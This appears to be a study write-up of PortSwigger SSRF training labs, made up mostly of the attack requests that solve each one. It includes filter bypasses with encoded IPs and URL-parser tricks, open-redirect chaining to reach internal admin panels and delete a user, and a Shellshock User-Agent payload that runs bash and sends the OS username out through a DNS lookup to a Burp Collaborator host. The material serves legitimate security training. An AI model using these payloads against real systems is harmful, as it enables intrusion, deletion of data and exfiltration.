---
description: https://portswigger.net/web-security/ssrf
---

# Server-side request forgery (SSRF)

### Lab: Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.

```
POST /product/stock
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

```
POST /product/stock
...
stockApi=http%3a//localhost/admin
-------------------
POST /product/stock
...
stockApi=http%3a//localhost/admin/delete?username=carlos
```

### Lab: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

```
POST /product/stock HTTP/1.1
...
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

→ Sniper Attack with numbers

```
POST /product/stock HTTP/1.1
...
stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
----------------------------
POST /product/stock HTTP/1.1
...
stockApi=http%3A%2F%2F192.168.0.182%3A8080%2Fadmin
Response:
<a href="/http://192.168.0.182:8080/admin/delete?username=carlos">Delete</a>
----------------------------
POST /product/stock HTTP/1.1
...
stockApi=http%3A%2F%2F192.168.0.182%3A8080%2Fadmin/delete?username=carlos
```

### Lab: SSRF with blacklist-based input filter

This lab has a stock check feature which fetches data from an internal system. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

```
POST /product/stock
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

* `localhost - blocked`
* `127.0.0.1 - blocked`
* `2130706433 - bypassed`
* `017700000001 - bypassed`
* `127.1 - bypassed`
* `admin - blocked`
* `%61%64%6d%69%6e - admin url all chars encoded - blocked`
* `%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 - admin url double all chars encoded - bypassed`

```
POST /product/stock
...
stockApi=http%3A%2F%2F127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

### Lab: SSRF with whitelist-based input filter

This lab has a stock check feature which fetches data from an internal system. The developer has deployed an anti-SSRF defense you will need to bypass.

```
POST /product/stock
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

`Error → "External stock check host must be stock.weliketoshop.net"`

```
POST /product/stock
...
stockApi=http%3A%2F%2Flocalhost:80%25%32%33@stock.weliketoshop.net
-------------------
POST /product/stock
...
stockApi=http%3A%2F%2Flocalhost:80%25%32%33@stock.weliketoshop.net/admin
-------------------
POST /product/stock
...
stockApi=http%3A%2F%2Flocalhost:80%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
```

`https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf`

### Lab: SSRF with filter bypass via open redirection vulnerability

This lab has a stock check feature which fetches data from an internal system. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

```
GET /product/nextProduct?currentProductId=3&path=/product?productId=4 HTTP/1.1
```

```
POST /product/stock
...
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
-------------------
POST /product/stock
...
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

### Lab: Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

Collaborator address: pxq0vdgf9ukiw23j0koup8bsbjh95y.burpcollaborator.net

```
GET /product?productId=3 HTTP/1.1
...
Referer: http://pxq0vdgf9ukiw23j0koup8bsbjh95y.burpcollaborator.net
...
```

### Lab: Blind SSRF with Shellshock exploitation

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

Collaborator address: hdysb5w7pm0acujbgc4m50rkrbx2lr.burpcollaborator.net

Shellshock: [https://www.exploit-db.com/exploits/34765](https://www.exploit-db.com/exploits/34765)

→ Sniper Attack - Number 0-255

```
GET /product?productId=20 HTTP/1.1
...
User-Agent: () { :; }; /bin/bash -c "nslookup $(whoami).hdysb5w7pm0acujbgc4m50rkrbx2lr.burpcollaborator.net"
...
Referer: https://192.168.0.§1§:8080/
...
```

The Collaborator server received a DNS lookup of type AAAA for the domain name peter-rmQazs.hdysb5w7pm0acujbgc4m50rkrbx2lr.burpcollaborator.net.
